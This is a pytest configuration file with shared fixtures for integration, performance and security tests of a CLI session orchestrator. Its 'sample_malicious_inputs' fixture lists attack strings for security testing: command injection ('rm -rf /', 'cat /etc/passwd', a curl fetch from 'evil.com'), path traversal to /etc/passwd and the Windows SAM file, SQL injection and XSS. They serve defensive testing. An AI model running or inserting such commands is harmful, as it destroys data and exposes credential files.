"""
Pytest configuration and shared fixtures for CLI integration tests.

Provides common fixtures, test configuration, and utilities for all test suites.
"""

import asyncio
import os
import tempfile
from typing import Any
from unittest.mock import MagicMock, patch

import pytest
import redis


# Test markers
def pytest_configure(config):
    """Configure pytest markers."""
    config.addinivalue_line("markers", "integration: mark test as integration test")
    config.addinivalue_line("markers", "performance: mark test as performance test")
    config.addinivalue_line("markers", "security: mark test as security test")
    config.addinivalue_line("markers", "slow: mark test as slow running")
    config.addinivalue_line("markers", "redis: mark test as requiring Redis")
    config.addinivalue_line("markers", "websocket: mark test as WebSocket test")


# Test collection configuration
def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers based on file paths."""
    for item in items:
        # Add markers based on test file path
        if "integration" in item.fspath.strpath:
            item.add_marker(pytest.mark.integration)
        if "performance" in item.fspath.strpath:
            item.add_marker(pytest.mark.performance)
            item.add_marker(pytest.mark.slow)
        if "security" in item.fspath.strpath:
            item.add_marker(pytest.mark.security)
        if "websocket" in item.name.lower():
            item.add_marker(pytest.mark.websocket)


# Session-scoped fixtures
@pytest.fixture(scope="session")
def event_loop():
    """Create event loop for async tests."""
    loop = asyncio.new_event_loop()
    yield loop
    loop.close()


@pytest.fixture(scope="session")
def redis_client():
    """Create Redis client for testing."""
    try:
        client = redis.Redis(host="localhost", port=6379, db=15, decode_responses=True)
        client.ping()  # Test connection
        client.flushdb()  # Clean test database
        yield client
        client.flushdb()  # Clean up after tests
        client.close()
    except redis.ConnectionError:
        pytest.skip("Redis not available for testing")


# Function-scoped fixtures
@pytest.fixture
def temp_dir():
    """Create temporary directory for tests."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield tmpdir


@pytest.fixture
def mock_env_vars():
    """Mock environment variables for testing."""
    mock_vars = {
        "ANTHROPIC_API_KEY": "test-anthropic-key",
        "OPENAI_API_KEY": "test-openai-key",
        "GOOGLE_API_KEY": "test-google-key",
        "JWT_SECRET": "test-jwt-secret",
        "REDIS_URL": "redis://localhost:6379/15",
    }

    with patch.dict(os.environ, mock_vars):
        yield mock_vars


@pytest.fixture
def mock_persistence_manager():
    """Create mock persistence manager for testing."""
    mock_manager = MagicMock()

    # Mock session creation
    def create_session_side_effect(*args, **kwargs):
        mock_session = MagicMock()
        mock_session.id = f"mock-session-{hash(str(args) + str(kwargs)) % 10000}"
        return mock_session

    mock_manager.create_session.side_effect = create_session_side_effect
    mock_manager.get_session.return_value = None
    mock_manager.list_sessions.return_value = []
    mock_manager.get_session_history.return_value = []
    mock_manager.get_session_metrics.return_value = {"total_sessions": 0, "active_sessions": 0}

    return mock_manager


@pytest.fixture
def cli_test_config():
    """Configuration for CLI integration tests."""
    return {
        "max_concurrent_sessions": 10,
        "session_timeout": 3600,
        "websocket_timeout": 60,
        "max_message_size": 1024 * 1024,  # 1MB
        "heartbeat_interval": 30,
        "test_cli_tools": ["claude", "codex", "gemini", "cursor"],
        "test_modes": ["cli", "interactive"],
    }


@pytest.fixture
def performance_test_config():
    """Configuration for performance tests."""
    return {
        "max_sessions": 50,
        "max_connections": 100,
        "max_messages": 1000,
        "max_memory_mb": 500,
        "max_latency_ms": 500,
        "min_throughput_ops_sec": 10,
    }


@pytest.fixture
def security_test_config():
    """Configuration for security tests."""
    return {
        "jwt_secret": "test-secret-key",
        "token_expiry_hours": 1,
        "max_auth_attempts": 5,
        "rate_limit_window": 60,
        "max_requests_per_window": 100,
    }


# Test utilities
class TestUtilities:
    """Utility functions for tests."""

    @staticmethod
    def assert_valid_session_id(session_id: str):
        """Assert that a session ID is valid."""
        assert isinstance(session_id, str)
        assert len(session_id) > 0
        assert len(session_id) < 256
        # Should not contain path traversal patterns
        assert "../" not in session_id
        assert "..\\" not in session_id
        # Should not contain SQL injection patterns
        assert "'" not in session_id
        assert ";" not in session_id
        assert "--" not in session_id

    @staticmethod
    def assert_valid_websocket_message(message_dict: dict[str, Any]):
        """Assert that a WebSocket message is valid."""
        assert "type" in message_dict
        assert "session_id" in message_dict
        assert "timestamp" in message_dict
        assert "data" in message_dict
        assert isinstance(message_dict["data"], dict)

    @staticmethod
    def assert_performance_metrics_valid(metrics: dict[str, Any]):
        """Assert that performance metrics are valid."""
        required_fields = [
            "total_time_seconds",
            "total_operations",
            "success_count",
            "error_count",
            "success_rate",
        ]

        for field in required_fields:
            assert field in metrics, f"Missing required metric: {field}"

        assert metrics["success_rate"] >= 0.0
        assert metrics["success_rate"] <= 1.0
        assert metrics["total_operations"] >= 0
        assert metrics["success_count"] >= 0
        assert metrics["error_count"] >= 0


@pytest.fixture
def test_utils():
    """Provide test utilities."""
    return TestUtilities


# Error handling fixtures
@pytest.fixture
def capture_logs():
    """Capture logs during tests."""
    import io
    import logging

    log_capture = io.StringIO()
    handler = logging.StreamHandler(log_capture)
    logger = logging.getLogger()
    logger.addHandler(handler)
    logger.setLevel(logging.DEBUG)

    yield log_capture

    logger.removeHandler(handler)


# Cleanup fixtures
@pytest.fixture(autouse=True)
def cleanup_globals():
    """Clean up global state after each test."""
    yield

    # Reset global singleton instances
    import orchestrator.cli_session_manager
    import orchestrator.cli_websocket

    orchestrator.cli_session_manager._cli_session_manager = None
    orchestrator.cli_websocket._cli_websocket_handler = None


# Skip conditions
def pytest_runtest_setup(item):
    """Setup function to handle test skipping."""
    # Skip Redis tests if Redis is not available
    if "redis" in [marker.name for marker in item.iter_markers()]:
        try:
            redis_client = redis.Redis(host="localhost", port=6379, db=15)
            redis_client.ping()
            redis_client.close()
        except:
            pytest.skip("Redis not available")

    # Skip performance tests in CI unless explicitly requested
    if "performance" in [marker.name for marker in item.iter_markers()]:
        if os.getenv("CI") and not os.getenv("RUN_PERFORMANCE_TESTS"):
            pytest.skip("Performance tests skipped in CI (set RUN_PERFORMANCE_TESTS=1 to enable)")

    # Skip security tests that require specific setup
    if "security" in [marker.name for marker in item.iter_markers()]:
        if os.getenv("SKIP_SECURITY_TESTS"):
            pytest.skip("Security tests skipped (SKIP_SECURITY_TESTS is set)")


# Test data fixtures
@pytest.fixture
def sample_cli_commands():
    """Sample CLI commands for testing."""
    return ["ls -la", "pwd", "echo 'hello world'", "python --version", "git status", "help", "exit"]


@pytest.fixture
def sample_websocket_messages():
    """Sample WebSocket messages for testing."""
    return [
        {
            "type": "command",
            "session_id": "test-session",
            "data": {"command": "ls -la"},
            "timestamp": "2024-01-01T00:00:00.000Z",
            "message_id": "msg-001",
        },
        {
            "type": "output",
            "session_id": "test-session",
            "data": {"output": "Hello World", "output_type": "stdout"},
            "timestamp": "2024-01-01T00:00:01.000Z",
            "message_id": "msg-002",
        },
        {
            "type": "status",
            "session_id": "test-session",
            "data": {"state": "running", "pid": 12345},
            "timestamp": "2024-01-01T00:00:02.000Z",
            "message_id": "msg-003",
        },
    ]


@pytest.fixture
def sample_malicious_inputs():
    """Sample malicious inputs for security testing."""
    return [
        # Command injection
        "ls; rm -rf /",
        "ls && cat /etc/passwd",
        "$(curl evil.com/malware.sh)",
        # Path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        # SQL injection
        "'; DROP TABLE users; --",
        "admin'--",
        # XSS
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        # Binary payloads
        "\x00\x01\x02\x03",
        # Large payloads
        "A" * 100000,
    ]


# Mock CLI process fixture
@pytest.fixture
def mock_cli_process():
    """Create mock CLI process for testing."""
    mock_process = MagicMock()
    mock_process.pid = 12345
    mock_process.returncode = None
    mock_process.poll.return_value = None  # Process running
    mock_process.wait.return_value = 0
    mock_process.stdout = MagicMock()
    mock_process.stderr = MagicMock()
    mock_process.stdin = MagicMock()

    return mock_process
